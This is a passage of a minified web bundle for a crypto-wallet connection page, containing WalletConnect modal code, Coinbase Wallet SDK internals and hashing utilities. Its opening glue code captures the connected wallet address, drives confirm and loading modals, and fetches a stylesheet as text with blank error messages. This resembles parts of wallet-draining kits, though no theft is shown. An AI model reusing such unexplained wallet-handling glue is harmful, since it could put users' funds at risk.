          `}}}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(s=>{s&&s.length>0&&(Gf(),Ene(),setTimeout(()=>{cE(),i({provider:n,walletAddress:s[0],name:r.info.name})},1500))}).catch(s=>{console.error("Failed to get accounts:",s),Gf(),nP()})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),Gf(),nP()}}async function HJe(){try{const r=await fetch("./assets/styles5.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}const VJe=Object.freeze(Object.defineProperty({__proto__:null,disconnectWallet:DJe,hideModal:cE,initModal:LJe,openModal:Sne,showConfirmModal:FJe,showErrorModal:qJe,showLoadingModal:jJe},Symbol.toStringTag,{value:"Module"})),KJe=ge`
  :host {
    z-index: var(--w3m-z-index);
    display: block;
    backface-visibility: hidden;
    will-change: opacity;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    pointer-events: none;
    opacity: 0;
    background-color: var(--wui-cover);
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host(.open) {
    opacity: 1;
  }

  :host(.embedded) {
    position: relative;
    pointer-events: unset;
    background: none;
    width: 100%;
    opacity: 1;
  }

  wui-card {
    max-width: var(--w3m-modal-width);
    width: 100%;
    position: relative;
    animation: zoom-in 0.2s var(--wui-ease-out-power-2);
    animation-fill-mode: backwards;
    outline: none;
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host(.embedded) wui-card {
    max-width: 400px;
  }

  wui-card[shake='true'] {
    animation:
      zoom-in 0.2s var(--wui-ease-out-power-2),
      w3m-shake 0.5s var(--wui-ease-out-power-2);
  }

  wui-flex {
    overflow-x: hidden;
    overflow-y: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
  }

  @media (max-height: 700px) and (min-width: 431px) {
    wui-flex {
      align-items: flex-start;
    }

    wui-card {
      margin: var(--wui-spacing-xxl) 0px;
    }
  }

  @media (max-width: 430px) {
    wui-flex {
      align-items: flex-end;
    }

    wui-card {
      max-width: 100%;
      border-bottom-left-radius: var(--local-border-bottom-mobile-radius);
      border-bottom-right-radius: var(--local-border-bottom-mobile-radius);
      border-bottom: none;
      animation: slide-in 0.2s var(--wui-ease-out-power-2);
    }

    wui-card[shake='true'] {
      animation:
        slide-in 0.2s var(--wui-ease-out-power-2),
        w3m-shake 0.5s var(--wui-ease-out-power-2);
    }
  }

  @keyframes zoom-in {
    0% {
      transform: scale(0.95) translateY(0);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes slide-in {
    0% {
      transform: scale(1) translateY(50px);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes w3m-shake {
    0% {
      transform: scale(1) rotate(0deg);
    }
    20% {
      transform: scale(1) rotate(-1deg);
    }
    40% {
      transform: scale(1) rotate(1.5deg);
    }
    60% {
      transform: scale(1) rotate(-1.5deg);
    }
    80% {
      transform: scale(1) rotate(1deg);
    }
    100% {
      transform: scale(1) rotate(0deg);
    }
  }

  @keyframes w3m-view-height {
    from {
      height: var(--prev-height);
    }
    to {
      height: var(--new-height);
    }
  }
`;var W3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const eV="scroll-lock";let x0=class extends he{constructor(){super(),this.unsubscribe=[],this.abortController=void 0,this.hasPrefetched=!1,this.enableEmbedded=Ne.state.enableEmbedded,this.open=Ut.state.open,this.caipAddress=re.state.activeCaipAddress,this.caipNetwork=re.state.activeCaipNetwork,this.shake=Ut.state.shake,this.initializeTheming(),Ft.prefetchAnalyticsConfig(),this.unsubscribe.push(Ut.subscribeKey("open",e=>e?this.onOpen():this.onClose()),Ut.subscribeKey("shake",e=>this.shake=e),re.subscribeKey("activeCaipNetwork",e=>this.onNewNetwork(e)),re.subscribeKey("activeCaipAddress",e=>this.onNewAddress(e)),Ne.subscribeKey("enableEmbedded",e=>this.enableEmbedded=e))}firstUpdated(){if(Nr.fetchNetworkImage(this.caipNetwork?.assets?.imageId),this.caipAddress){if(this.enableEmbedded){Ut.close(),this.prefetch();return}this.onNewAddress(this.caipAddress)}this.open&&this.onOpen(),this.enableEmbedded&&this.prefetch()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.onRemoveKeyboardListener()}render(){return this.style.cssText=`
      --local-border-bottom-mobile-radius: ${this.enableEmbedded?"clamp(0px, var(--wui-border-radius-l), 44px)":"0px"};
    `,this.enableEmbedded?F`${this.contentTemplate()}
        <w3m-tooltip></w3m-tooltip> `:this.open?F`
          <wui-flex @click=${this.onOverlayClick.bind(this)} data-testid="w3m-modal-overlay">
            ${this.contentTemplate()}
          </wui-flex>
          <w3m-tooltip></w3m-tooltip>
        `:null}contentTemplate(){return F` <wui-card
      shake="${this.shake}"
      data-embedded="${ye(this.enableEmbedded)}"
      role="alertdialog"
      aria-modal="true"
      tabindex="0"
      data-testid="w3m-modal-card"
    >
      <w3m-header></w3m-header>
      <w3m-router></w3m-router>
      <w3m-snackbar></w3m-snackbar>
      <w3m-alertbar></w3m-alertbar>
    </wui-card>`}async onOverlayClick(e){e.target===e.currentTarget&&await this.handleClose()}async handleClose(){Ee.state.view==="UnsupportedChain"||await xd.isSIWXCloseDisabled()?Ut.shake():Ut.close()}initializeTheming(){const{themeVariables:e,themeMode:t}=Mi.state,i=Wt.getColorTheme(t);fee(e,i)}onClose(){this.open=!1,this.classList.remove("open"),this.onScrollUnlock(),vt.hide(),this.onRemoveKeyboardListener()}onOpen(){this.prefetch(),this.open=!0,this.classList.add("open"),this.onScrollLock(),this.onAddKeyboardListener()}onScrollLock(){const e=document.createElement("style");e.dataset.w3m=eV,e.textContent=`
      body {
        touch-action: none;
        overflow: hidden;
        overscroll-behavior: contain;
      }
      w3m-modal {
        pointer-events: auto;
      }
    `,document.head.appendChild(e)}onScrollUnlock(){const e=document.head.querySelector(`style[data-w3m="${eV}"]`);e&&e.remove()}onAddKeyboardListener(){this.abortController=new AbortController;const e=this.shadowRoot?.querySelector("wui-card");e?.focus(),window.addEventListener("keydown",t=>{if(t.key==="Escape")this.handleClose();else if(t.key==="Tab"){const{tagName:i}=t.target;i&&!i.includes("W3M-")&&!i.includes("WUI-")&&e?.focus()}},this.abortController)}onRemoveKeyboardListener(){this.abortController?.abort(),this.abortController=void 0}async onNewAddress(e){const t=re.state.isSwitchingNamespace,i=ke.getPlainAddress(e);!i&&!t?Ut.close():t&&i&&Ee.goBack(),await xd.initializeIfEnabled(),this.caipAddress=e,re.setIsSwitchingNamespace(!1)}onNewNetwork(e){Nr.fetchNetworkImage(e?.assets?.imageId);const t=this.caipNetwork?.caipNetworkId?.toString(),i=e?.caipNetworkId?.toString(),n=t&&i&&t!==i,s=re.state.isSwitchingNamespace,o=this.caipNetwork?.name===Me.UNSUPPORTED_NETWORK_NAME,a=Ee.state.view==="ConnectingExternal",c=!this.caipAddress,l=n&&!o&&!s,u=Ee.state.view==="UnsupportedChain";!a&&(c||u||l)&&Ee.goBack(),this.caipNetwork=e}prefetch(){this.hasPrefetched||(this.hasPrefetched=!0,Ft.prefetch())}};x0.styles=KJe;W3([V({type:Boolean})],x0.prototype,"enableEmbedded",void 0);W3([te()],x0.prototype,"open",void 0);W3([te()],x0.prototype,"caipAddress",void 0);W3([te()],x0.prototype,"caipNetwork",void 0);W3([te()],x0.prototype,"shake",void 0);x0=W3([me("w3m-modal")],x0);const GJe=Object.freeze(Object.defineProperty({__proto__:null,get W3mModal(){return x0}},Symbol.toStringTag,{value:"Module"}));class Vd{constructor(e,t){this.scope=e,this.module=t}storeObject(e,t){this.setItem(e,JSON.stringify(t))}loadObject(e){const t=this.getItem(e);return t?JSON.parse(t):void 0}setItem(e,t){localStorage.setItem(this.scopedKey(e),t)}getItem(e){return localStorage.getItem(this.scopedKey(e))}removeItem(e){localStorage.removeItem(this.scopedKey(e))}clear(){const e=this.scopedKey(""),t=[];for(let i=0;i<localStorage.length;i++){const n=localStorage.key(i);typeof n=="string"&&n.startsWith(e)&&t.push(n)}t.forEach(i=>localStorage.removeItem(i))}scopedKey(e){return`-${this.scope}${this.module?`:${this.module}`:""}:${e}`}static clearAll(){new Vd("CBWSDK").clear(),new Vd("walletlink").clear()}}const Hn={rpc:{invalidInput:-32e3,resourceNotFound:-32001,resourceUnavailable:-32002,transactionRejected:-32003,methodNotSupported:-32004,limitExceeded:-32005,parse:-32700,invalidRequest:-32600,methodNotFound:-32601,invalidParams:-32602,internal:-32603},provider:{userRejectedRequest:4001,unauthorized:4100,unsupportedMethod:4200,disconnected:4900,chainDisconnected:4901,unsupportedChain:4902}},sP={"-32700":{standard:"JSON RPC 2.0",message:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."},"-32600":{standard:"JSON RPC 2.0",message:"The JSON sent is not a valid Request object."},"-32601":{standard:"JSON RPC 2.0",message:"The method does not exist / is not available."},"-32602":{standard:"JSON RPC 2.0",message:"Invalid method parameter(s)."},"-32603":{standard:"JSON RPC 2.0",message:"Internal JSON-RPC error."},"-32000":{standard:"EIP-1474",message:"Invalid input."},"-32001":{standard:"EIP-1474",message:"Resource not found."},"-32002":{standard:"EIP-1474",message:"Resource unavailable."},"-32003":{standard:"EIP-1474",message:"Transaction rejected."},"-32004":{standard:"EIP-1474",message:"Method not supported."},"-32005":{standard:"EIP-1474",message:"Request limit exceeded."},4001:{standard:"EIP-1193",message:"User rejected the request."},4100:{standard:"EIP-1193",message:"The requested account and/or method has not been authorized by the user."},4200:{standard:"EIP-1193",message:"The requested method is not supported by this Ethereum provider."},4900:{standard:"EIP-1193",message:"The provider is disconnected from all chains."},4901:{standard:"EIP-1193",message:"The provider is disconnected from the specified chain."},4902:{standard:"EIP-3085",message:"Unrecognized chain ID."}},Ane="Unspecified error message.",ZJe="Unspecified server error.";function ZO(r,e=Ane){if(r&&Number.isInteger(r)){const t=r.toString();if(oP(sP,t))return sP[t].message;if(Ine(r))return ZJe}return e}function YJe(r){if(!Number.isInteger(r))return!1;const e=r.toString();return!!(sP[e]||Ine(r))}function JJe(r,{shouldIncludeStack:e=!1}={}){const t={};if(r&&typeof r=="object"&&!Array.isArray(r)&&oP(r,"code")&&YJe(r.code)){const i=r;t.code=i.code,i.message&&typeof i.message=="string"?(t.message=i.message,oP(i,"data")&&(t.data=i.data)):(t.message=ZO(t.code),t.data={originalError:tV(r)})}else t.code=Hn.rpc.internal,t.message=rV(r,"message")?r.message:Ane,t.data={originalError:tV(r)};return e&&(t.stack=rV(r,"stack")?r.stack:void 0),t}function Ine(r){return r>=-32099&&r<=-32e3}function tV(r){return r&&typeof r=="object"&&!Array.isArray(r)?Object.assign({},r):r}function oP(r,e){return Object.prototype.hasOwnProperty.call(r,e)}function rV(r,e){return typeof r=="object"&&r!==null&&e in r&&typeof r[e]=="string"}const ni={rpc:{parse:r=>jc(Hn.rpc.parse,r),invalidRequest:r=>jc(Hn.rpc.invalidRequest,r),invalidParams:r=>jc(Hn.rpc.invalidParams,r),methodNotFound:r=>jc(Hn.rpc.methodNotFound,r),internal:r=>jc(Hn.rpc.internal,r),server:r=>{if(!r||typeof r!="object"||Array.isArray(r))throw new Error("Ethereum RPC Server errors must provide single object argument.");const{code:e}=r;if(!Number.isInteger(e)||e>-32005||e<-32099)throw new Error('"code" must be an integer such that: -32099 <= code <= -32005');return jc(e,r)},invalidInput:r=>jc(Hn.rpc.invalidInput,r),resourceNotFound:r=>jc(Hn.rpc.resourceNotFound,r),resourceUnavailable:r=>jc(Hn.rpc.resourceUnavailable,r),transactionRejected:r=>jc(Hn.rpc.transactionRejected,r),methodNotSupported:r=>jc(Hn.rpc.methodNotSupported,r),limitExceeded:r=>jc(Hn.rpc.limitExceeded,r)},provider:{userRejectedRequest:r=>am(Hn.provider.userRejectedRequest,r),unauthorized:r=>am(Hn.provider.unauthorized,r),unsupportedMethod:r=>am(Hn.provider.unsupportedMethod,r),disconnected:r=>am(Hn.provider.disconnected,r),chainDisconnected:r=>am(Hn.provider.chainDisconnected,r),unsupportedChain:r=>am(Hn.provider.unsupportedChain,r),custom:r=>{if(!r||typeof r!="object"||Array.isArray(r))throw new Error("Ethereum Provider custom errors must provide single object argument.");const{code:e,message:t,data:i}=r;if(!t||typeof t!="string")throw new Error('"message" must be a nonempty string');return new Nne(e,t,i)}}};function jc(r,e){const[t,i]=Tne(e);return new kne(r,t||ZO(r),i)}function am(r,e){const[t,i]=Tne(e);return new Nne(r,t||ZO(r),i)}function Tne(r){if(r){if(typeof r=="string")return[r];if(typeof r=="object"&&!Array.isArray(r)){const{message:e,data:t}=r;if(e&&typeof e!="string")throw new Error("Must specify string message.");return[e||void 0,t]}}return[]}class kne extends Error{constructor(e,t,i){if(!Number.isInteger(e))throw new Error('"code" must be an integer.');if(!t||typeof t!="string")throw new Error('"message" must be a nonempty string.');super(t),this.code=e,i!==void 0&&(this.data=i)}}class Nne extends kne{constructor(e,t,i){if(!QJe(e))throw new Error('"code" must be an integer such that: 1000 <= code <= 4999');super(e,t,i)}}function QJe(r){return Number.isInteger(r)&&r>=1e3&&r<=4999}function YO(){return r=>r}const ky=YO(),XJe=YO(),eQe=YO();function Fh(r){return Math.floor(r)}const Pne=/^[0-9]*$/,$ne=/^[a-f0-9]*$/;function d1(r){return JO(crypto.getRandomValues(new Uint8Array(r)))}function JO(r){return[...r].map(e=>e.toString(16).padStart(2,"0")).join("")}function E9(r){return new Uint8Array(r.match(/.{1,2}/g).map(e=>Number.parseInt(e,16)))}function W5(r,e=!1){const t=r.toString("hex");return ky(e?`0x${t}`:t)}function HI(r){return W5(aP(r),!0)}function Gu(r){return eQe(r.toString(10))}function Df(r){return ky(`0x${BigInt(r).toString(16)}`)}function Rne(r){return r.startsWith("0x")||r.startsWith("0X")}function QO(r){return Rne(r)?r.slice(2):r}function One(r){return Rne(r)?`0x${r.slice(2)}`:`0x${r}`}function lE(r){if(typeof r!="string")return!1;const e=QO(r).toLowerCase();return $ne.test(e)}function tQe(r,e=!1){if(typeof r=="string"){const t=QO(r).toLowerCase();if($ne.test(t))return ky(e?`0x${t}`:t)}throw ni.rpc.invalidParams(`"${String(r)}" is not a hexadecimal string`)}function XO(r,e=!1){let t=tQe(r,!1);return t.length%2===1&&(t=ky(`0${t}`)),e?ky(`0x${t}`):t}function lf(r){if(typeof r=="string"){const e=QO(r).toLowerCase();if(lE(e)&&e.length===40)return XJe(One(e))}throw ni.rpc.invalidParams(`Invalid Ethereum address: ${String(r)}`)}function aP(r){if(Buffer.isBuffer(r))return r;if(typeof r=="string"){if(lE(r)){const e=XO(r,!1);return Buffer.from(e,"hex")}return Buffer.from(r,"utf8")}throw ni.rpc.invalidParams(`Not binary data: ${String(r)}`)}function H5(r){if(typeof r=="number"&&Number.isInteger(r))return Fh(r);if(typeof r=="string"){if(Pne.test(r))return Fh(Number(r));if(lE(r))return Fh(Number(BigInt(XO(r,!0))))}throw ni.rpc.invalidParams(`Not an integer: ${String(r)}`)}function jb(r){if(r!==null&&(typeof r=="bigint"||iQe(r)))return BigInt(r.toString(10));if(typeof r=="number")return BigInt(H5(r));if(typeof r=="string"){if(Pne.test(r))return BigInt(r);if(lE(r))return BigInt(XO(r,!0))}throw ni.rpc.invalidParams(`Not an integer: ${String(r)}`)}function rQe(r){if(typeof r=="string")return JSON.parse(r);if(typeof r=="object")return r;throw ni.rpc.invalidParams(`Not a JSON string or an object: ${String(r)}`)}function iQe(r){if(r==null||typeof r.constructor!="function")return!1;const{constructor:e}=r;return typeof e.config=="function"&&typeof e.EUCLID=="number"}async function nQe(){return crypto.subtle.generateKey({name:"ECDH",namedCurve:"P-256"},!0,["deriveKey"])}async function sQe(r,e){return crypto.subtle.deriveKey({name:"ECDH",public:e},r,{name:"AES-GCM",length:256},!1,["encrypt","decrypt"])}async function oQe(r,e){const t=crypto.getRandomValues(new Uint8Array(12)),i=await crypto.subtle.encrypt({name:"AES-GCM",iv:t},r,new TextEncoder().encode(e));return{iv:t,cipherText:i}}async function aQe(r,{iv:e,cipherText:t}){const i=await crypto.subtle.decrypt({name:"AES-GCM",iv:e},r,t);return new TextDecoder().decode(i)}function Bne(r){switch(r){case"public":return"spki";case"private":return"pkcs8"}}async function Mne(r,e){const t=Bne(r),i=await crypto.subtle.exportKey(t,e);return JO(new Uint8Array(i))}async function Dne(r,e){const t=Bne(r),i=E9(e).buffer;return await crypto.subtle.importKey(t,new Uint8Array(i),{name:"ECDH",namedCurve:"P-256"},!0,r==="private"?["deriveKey"]:[])}async function cQe(r,e){const t=JSON.stringify(r,(i,n)=>{if(!(n instanceof Error))return n;const s=n;return Object.assign(Object.assign({},s.code?{code:s.code}:{}),{message:s.message})});return oQe(e,t)}async function lQe(r,e){return JSON.parse(await aQe(e,r))}const VI={storageKey:"ownPrivateKey",keyType:"private"},KI={storageKey:"ownPublicKey",keyType:"public"},GI={storageKey:"peerPublicKey",keyType:"public"};class uQe{constructor(){this.storage=new Vd("CBWSDK","SCWKeyManager"),this.ownPrivateKey=null,this.ownPublicKey=null,this.peerPublicKey=null,this.sharedSecret=null}async getOwnPublicKey(){return await this.loadKeysIfNeeded(),this.ownPublicKey}async getSharedSecret(){return await this.loadKeysIfNeeded(),this.sharedSecret}async setPeerPublicKey(e){this.sharedSecret=null,this.peerPublicKey=e,await this.storeKey(GI,e),await this.loadKeysIfNeeded()}async clear(){this.ownPrivateKey=null,this.ownPublicKey=null,this.peerPublicKey=null,this.sharedSecret=null,this.storage.removeItem(KI.storageKey),this.storage.removeItem(VI.storageKey),this.storage.removeItem(GI.storageKey)}async generateKeyPair(){const e=await nQe();this.ownPrivateKey=e.privateKey,this.ownPublicKey=e.publicKey,await this.storeKey(VI,e.privateKey),await this.storeKey(KI,e.publicKey)}async loadKeysIfNeeded(){if(this.ownPrivateKey===null&&(this.ownPrivateKey=await this.loadKey(VI)),this.ownPublicKey===null&&(this.ownPublicKey=await this.loadKey(KI)),(this.ownPrivateKey===null||this.ownPublicKey===null)&&await this.generateKeyPair(),this.peerPublicKey===null&&(this.peerPublicKey=await this.loadKey(GI)),this.sharedSecret===null){if(this.ownPrivateKey===null||this.peerPublicKey===null)return;this.sharedSecret=await sQe(this.ownPrivateKey,this.peerPublicKey)}}async loadKey(e){const t=this.storage.getItem(e.storageKey);return t?Dne(e.keyType,t):null}async storeKey(e,t){const i=await Mne(e.keyType,t);this.storage.setItem(e.storageKey,i)}}const Y4="4.3.0",Lne="@coinbase/wallet-sdk";async function eB(r,e){const t=Object.assign(Object.assign({},r),{jsonrpc:"2.0",id:crypto.randomUUID()}),i=await window.fetch(e,{method:"POST",body:JSON.stringify(t),mode:"cors",headers:{"Content-Type":"application/json","X-Cbw-Sdk-Version":Y4,"X-Cbw-Sdk-Platform":Lne}}),{result:n,error:s}=await i.json();if(s)throw s;return n}function dQe(){return globalThis.coinbaseWalletExtension}function hQe(){var r,e;try{const t=globalThis;return(r=t.ethereum)!==null&&r!==void 0?r:(e=t.top)===null||e===void 0?void 0:e.ethereum}catch{return}}function fQe({metadata:r,preference:e}){var t,i;const{appName:n,appLogoUrl:s,appChainIds:o}=r;if(e.options!=="smartWalletOnly"){const c=dQe();if(c)return(t=c.setAppInfo)===null||t===void 0||t.call(c,n,s,o,e),c}const a=hQe();if(a?.isCoinbaseBrowser)return(i=a.setAppInfo)===null||i===void 0||i.call(a,n,s,o,e),a}function pQe(r){if(!r||typeof r!="object"||Array.isArray(r))throw ni.rpc.invalidParams({message:"Expected a single, non-array, object argument.",data:r});const{method:e,params:t}=r;if(typeof e!="string"||e.length===0)throw ni.rpc.invalidParams({message:"'args.method' must be a non-empty string.",data:r});if(t!==void 0&&!Array.isArray(t)&&(typeof t!="object"||t===null))throw ni.rpc.invalidParams({message:"'args.params' must be an object or array if provided.",data:r});switch(e){case"eth_sign":case"eth_signTypedData_v2":case"eth_subscribe":case"eth_unsubscribe":throw ni.provider.unsupportedMethod()}}const iV="accounts",nV="activeChain",sV="availableChains",oV="walletCapabilities";class gQe{constructor(e){var t,i,n;this.metadata=e.metadata,this.communicator=e.communicator,this.callback=e.callback,this.keyManager=new uQe,this.storage=new Vd("CBWSDK","SCWStateManager"),this.accounts=(t=this.storage.loadObject(iV))!==null&&t!==void 0?t:[],this.chain=this.storage.loadObject(nV)||{id:(n=(i=e.metadata.appChainIds)===null||i===void 0?void 0:i[0])!==null&&n!==void 0?n:1},this.handshake=this.handshake.bind(this),this.request=this.request.bind(this),this.createRequestMessage=this.createRequestMessage.bind(this),this.decryptResponseMessage=this.decryptResponseMessage.bind(this)}async handshake(e){var t,i,n,s;await((i=(t=this.communicator).waitForPopupLoaded)===null||i===void 0?void 0:i.call(t));const o=await this.createRequestMessage({handshake:{method:e.method,params:Object.assign({},this.metadata,(n=e.params)!==null&&n!==void 0?n:{})}}),a=await this.communicator.postRequestAndWaitForResponse(o);if("failure"in a.content)throw a.content.failure;const c=await Dne("public",a.sender);await this.keyManager.setPeerPublicKey(c);const u=(await this.decryptResponseMessage(a)).result;if("error"in u)throw u.error;switch(e.method){case"eth_requestAccounts":{const d=u.value;this.accounts=d,this.storage.storeObject(iV,d),(s=this.callback)===null||s===void 0||s.call(this,"accountsChanged",d);break}}}async request(e){var t;if(this.accounts.length===0)switch(e.method){case"wallet_sendCalls":return this.sendRequestToPopup(e);default:throw ni.provider.unauthorized()}switch(e.method){case"eth_requestAccounts":return(t=this.callback)===null||t===void 0||t.call(this,"connect",{chainId:Df(this.chain.id)}),this.accounts;case"eth_accounts":return this.accounts;case"eth_coinbase":return this.accounts[0];case"net_version":return this.chain.id;case"eth_chainId":return Df(this.chain.id);case"wallet_getCapabilities":return this.storage.loadObject(oV);case"wallet_switchEthereumChain":return this.handleSwitchChainRequest(e);case"eth_ecRecover":case"personal_sign":case"wallet_sign":case"personal_ecRecover":case"eth_signTransaction":case"eth_sendTransaction":case"eth_signTypedData_v1":case"eth_signTypedData_v3":case"eth_signTypedData_v4":case"eth_signTypedData":case"wallet_addEthereumChain":case"wallet_watchAsset":case"wallet_sendCalls":case"wallet_showCallsStatus":case"wallet_grantPermissions":return this.sendRequestToPopup(e);default:if(!this.chain.rpcUrl)throw ni.rpc.internal("No RPC URL set for chain");return eB(e,this.chain.rpcUrl)}}async sendRequestToPopup(e){var t,i;await((i=(t=this.communicator).waitForPopupLoaded)===null||i===void 0?void 0:i.call(t));const n=await this.sendEncryptedRequest(e),o=(await this.decryptResponseMessage(n)).result;if("error"in o)throw o.error;return o.value}async cleanup(){var e,t;this.storage.clear(),await this.keyManager.clear(),this.accounts=[],this.chain={id:(t=(e=this.metadata.appChainIds)===null||e===void 0?void 0:e[0])!==null&&t!==void 0?t:1}}async handleSwitchChainRequest(e){var t;const i=e.params;if(!i||!(!((t=i[0])===null||t===void 0)&&t.chainId))throw ni.rpc.invalidParams();const n=H5(i[0].chainId);if(this.updateChain(n))return null;const o=await this.sendRequestToPopup(e);return o===null&&this.updateChain(n),o}async sendEncryptedRequest(e){const t=await this.keyManager.getSharedSecret();if(!t)throw ni.provider.unauthorized("No valid session found, try requestAccounts before other methods");const i=await cQe({action:e,chainId:this.chain.id},t),n=await this.createRequestMessage({encrypted:i});return this.communicator.postRequestAndWaitForResponse(n)}async createRequestMessage(e){const t=await Mne("public",await this.keyManager.getOwnPublicKey());return{id:crypto.randomUUID(),sender:t,content:e,timestamp:new Date}}async decryptResponseMessage(e){var t,i;const n=e.content;if("failure"in n)throw n.failure;const s=await this.keyManager.getSharedSecret();if(!s)throw ni.provider.unauthorized("Invalid session");const o=await lQe(n.encrypted,s),a=(t=o.data)===null||t===void 0?void 0:t.chains;if(a){const l=Object.entries(a).map(([u,d])=>({id:Number(u),rpcUrl:d}));this.storage.storeObject(sV,l),this.updateChain(this.chain.id,l)}const c=(i=o.data)===null||i===void 0?void 0:i.capabilities;return c&&this.storage.storeObject(oV,c),o}updateChain(e,t){var i;const n=t??this.storage.loadObject(sV),s=n?.find(o=>o.id===e);return s?(s!==this.chain&&(this.chain=s,this.storage.storeObject(nV,s),(i=this.callback)===null||i===void 0||i.call(this,"chainChanged",Df(s.id))),!0):!1}}var nn={},wr={},aV;function mQe(){if(aV)return wr;aV=1,Object.defineProperty(wr,"__esModule",{value:!0}),wr.toBig=wr.shrSL=wr.shrSH=wr.rotrSL=wr.rotrSH=wr.rotrBL=wr.rotrBH=wr.rotr32L=wr.rotr32H=wr.rotlSL=wr.rotlSH=wr.rotlBL=wr.rotlBH=wr.add5L=wr.add5H=wr.add4L=wr.add4H=wr.add3L=wr.add3H=void 0,wr.add=m,wr.fromBig=t,wr.split=i;const r=BigInt(2**32-1),e=BigInt(32);function t(N,L=!1){return L?{h:Number(N&r),l:Number(N>>e&r)}:{h:Number(N>>e&r)|0,l:Number(N&r)|0}}function i(N,L=!1){const $=N.length;let y=new Uint32Array($),A=new Uint32Array($);for(let b=0;b<$;b++){const{h:v,l:_}=t(N[b],L);[y[b],A[b]]=[v,_]}return[y,A]}const n=(N,L)=>BigInt(N>>>0)<<e|BigInt(L>>>0);wr.toBig=n;const s=(N,L,$)=>N>>>$;wr.shrSH=s;const o=(N,L,$)=>N<<32-$|L>>>$;wr.shrSL=o;const a=(N,L,$)=>N>>>$|L<<32-$;wr.rotrSH=a;const c=(N,L,$)=>N<<32-$|L>>>$;wr.rotrSL=c;const l=(N,L,$)=>N<<64-$|L>>>$-32;wr.rotrBH=l;const u=(N,L,$)=>N>>>$-32|L<<64-$;wr.rotrBL=u;const d=(N,L)=>L;wr.rotr32H=d;const h=(N,L)=>N;wr.rotr32L=h;const f=(N,L,$)=>N<<$|L>>>32-$;wr.rotlSH=f;const p=(N,L,$)=>L<<$|N>>>32-$;wr.rotlSL=p;const g=(N,L,$)=>L<<$-32|N>>>64-$;wr.rotlBH=g;const w=(N,L,$)=>N<<$-32|L>>>64-$;wr.rotlBL=w;function m(N,L,$,y){const A=(L>>>0)+(y>>>0);return{h:N+$+(A/2**32|0)|0,l:A|0}}const x=(N,L,$)=>(N>>>0)+(L>>>0)+($>>>0);wr.add3L=x;const S=(N,L,$,y)=>L+$+y+(N/2**32|0)|0;wr.add3H=S;const T=(N,L,$,y)=>(N>>>0)+(L>>>0)+($>>>0)+(y>>>0);wr.add4L=T;const k=(N,L,$,y,A)=>L+$+y+A+(N/2**32|0)|0;wr.add4H=k;const I=(N,L,$,y,A)=>(N>>>0)+(L>>>0)+($>>>0)+(y>>>0)+(A>>>0);wr.add5L=I;const E=(N,L,$,y,A,b)=>L+$+y+A+b+(N/2**32|0)|0;wr.add5H=E;const C={fromBig:t,split:i,toBig:n,shrSH:s,shrSL:o,rotrSH:a,rotrSL:c,rotrBH:l,rotrBL:u,rotr32H:d,rotr32L:h,rotlSH:f,rotlSL:p,rotlBH:g,rotlBL:w,add:m,add3L:x,add3H:S,add4L:T,add4H:k,add5H:E,add5L:I};return wr.default=C,wr}var ZI={},Fb={},cV;function wQe(){return cV||(cV=1,Object.defineProperty(Fb,"__esModule",{value:!0}),Fb.crypto=void 0,Fb.crypto=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0),Fb}var lV;function bQe(){return lV||(lV=1,function(r){/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */Object.defineProperty(r,"__esModule",{value:!0}),r.wrapXOFConstructorWithOpts=r.wrapConstructorWithOpts=r.wrapConstructor=r.Hash=r.nextTick=r.swap32IfBE=r.byteSwapIfBE=r.swap8IfBE=r.isLE=void 0,r.isBytes=t,r.anumber=i,r.abytes=n,r.ahash=s,r.aexists=o,r.aoutput=a,r.u8=c,r.u32=l,r.clean=u,r.createView=d,r.rotr=h,r.rotl=f,r.byteSwap=p,r.byteSwap32=g,r.bytesToHex=x,r.hexToBytes=k,r.asyncLoop=E,r.utf8ToBytes=C,r.bytesToUtf8=N,r.toBytes=L,r.kdfInputToBytes=$,r.concatBytes=y,r.checkOpts=A,r.createHasher=v,r.createOptHasher=_,r.createXOFer=O,r.randomBytes=D;const e=wQe();function t(R){return R instanceof Uint8Array||ArrayBuffer.isView(R)&&R.constructor.name==="Uint8Array"}function i(R){if(!Number.isSafeInteger(R)||R<0)throw new Error("positive integer expected, got "+R)}function n(R,...P){if(!t(R))throw new Error("Uint8Array expected");if(P.length>0&&!P.includes(R.length))throw new Error("Uint8Array expected of length "+P+", got length="+R.length)}function s(R){if(typeof R!="function"||typeof R.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");i(R.outputLen),i(R.blockLen)}function o(R,P=!0){if(R.destroyed)throw new Error("Hash instance has been destroyed");if(P&&R.finished)throw new Error("Hash#digest() has already been called")}function a(R,P){n(R);const B=P.outputLen;if(R.length<B)throw new Error("digestInto() expects output buffer of length at least "+B)}function c(R){return new Uint8Array(R.buffer,R.byteOffset,R.byteLength)}function l(R){return new Uint32Array(R.buffer,R.byteOffset,Math.floor(R.byteLength/4))}function u(...R){for(let P=0;P<R.length;P++)R[P].fill(0)}function d(R){return new DataView(R.buffer,R.byteOffset,R.byteLength)}function h(R,P){return R<<32-P|R>>>P}function f(R,P){return R<<P|R>>>32-P>>>0}r.isLE=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function p(R){return 